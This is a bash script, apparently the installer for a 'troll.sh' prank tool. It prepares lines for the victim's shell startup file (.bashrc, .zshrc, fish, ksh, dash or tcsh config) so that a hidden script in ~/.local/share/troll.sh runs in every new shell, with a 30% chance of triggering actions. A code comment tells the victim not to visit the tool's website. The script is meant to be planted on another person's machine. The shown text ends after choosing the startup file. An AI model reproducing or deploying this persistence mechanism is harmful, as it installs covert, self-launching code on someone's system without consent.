#!/usr/bin/env bash

WEBSITE_URL="https://trollme.sh"
DIR_NAME="troll.sh"
FOLDER_LOCATION=$HOME"/.local/share/$DIR_NAME"
HASHBANG="#!/usr/bin/env bash"
TROLL_SCRIPT="troll.sh"
TROLL_SCRIPT_FULL="$FOLDER_LOCATION/$TROLL_SCRIPT"
RND_CHARS="6kr9kejrxx"
DOTPROFILE="$HOME/.bashrc"
DOTPROFILE_CONTENT=""
SCRIPTS_FOLDER="actions"
SCRIPTS_FOLDER_FULL="$FOLDER_LOCATION/actions"
INSTALL_DATE_SCRIPT="install_date.sh"

SCRIPT_PROBABILITIY=0.3 # 30% chance of running the script

SOURCE_NAMED="An unknown friend"
INSTALL_DATE=$(date)


dotprofile_content=$(cat <<-EOF


#$RND_CHARS
# Do NOT visit $WEBSITE_URL to read more about this
if [ -f "$TROLL_SCRIPT_FULL" ]; then
    source "$TROLL_SCRIPT_FULL"
else
    echo "The script $TROLL_SCRIPT does not exist in $FOLDER_LOCATION"
    echo "Please open your ~/.profile file and remove the lines marked between the two '$RND_CHARS' at the bottom of the file"
    echo "Visit $WEBSITE_URL to read more about this"
fi
#$RND_CHARS

EOF
)

dot_tcsh_content=$(cat <<-EOF


#$RND_CHARS
# Do NOT visit $WEBSITE_URL to read more about this
if (test -f "$TROLL_SCRIPT_FULL" ) then
    bash "$TROLL_SCRIPT_FULL"
else
    echo "The script $TROLL_SCRIPT does not exist in $FOLDER_LOCATION"
    echo "Please open your ~/.profile file and remove the lines marked between the two '$RND_CHARS' at the bottom of the file"
    echo "Visit $WEBSITE_URL to read more about this"
endif
#$RND_CHARS

EOF
)

dot_zsh_content=$(cat <<-EOF


#$RND_CHARS
# Do NOT visit $WEBSITE_URL to read more about this
if [[ -f "$TROLL_SCRIPT_FULL" ]]; then
    bash "$TROLL_SCRIPT_FULL"
else
    echo "The script $TROLL_SCRIPT does not exist in $FOLDER_LOCATION"
    echo "Please open your ~/.profile file and remove the lines marked between the two '$RND_CHARS' at the bottom of the file"
    echo "Visit $WEBSITE_URL to read more about this"
fi
#$RND_CHARS

EOF
)

dot_fish_content=$(cat <<-EOF


#$RND_CHARS
# Do NOT visit $WEBSITE_URL to read more about this
if test -f "$TROLL_SCRIPT_FULL"
    bash "$TROLL_SCRIPT_FULL"
else
    echo "The script $TROLL_SCRIPT does not exist in $FOLDER_LOCATION"
    echo "Please open your ~/.profile file and remove the lines marked between the two '$RND_CHARS' at the bottom of the file"
    echo "Visit $WEBSITE_URL to read more about this"
end
#$RND_CHARS

EOF
)

# Check the shell type based on the $SHELL variable
case "$SHELL" in
  /bin/bash)
    DOTPROFILE="$HOME/.bashrc" # not needed
    DOTPROFILE_CONTENT="$dotprofile_content"
    ;;
  /bin/zsh)
    DOTPROFILE="$HOME/.zshrc"
    DOTPROFILE_CONTENT="$dot_zsh_content"
    ;;
  /usr/bin/fish)
    DOTPROFILE="$HOME/.config/fish/config.fish"
    DOTPROFILE_CONTENT="$dot_fish_content"
    ;;
  /bin/ksh)
    DOTPROFILE="$HOME/.kshrc"
    DOTPROFILE_CONTENT="$dotprofile_content"
    ;;
  /bin/dash)
    DOTPROFILE="$HOME/.profile"
    DOTPROFILE_CONTENT="$dotprofile_content"
    ;;
  /bin/tcsh)
    DOTPROFILE="$HOME/.tcshrc"
    DOTPROFILE_CONTENT="$dot_tcsh_content"
    ;;
  *)
    echo "Shell not recognized. Configuration file unknown, using .bashrc"
    DOTPROFILE_CONTENT="$dotprofile_content"
    ;;
esac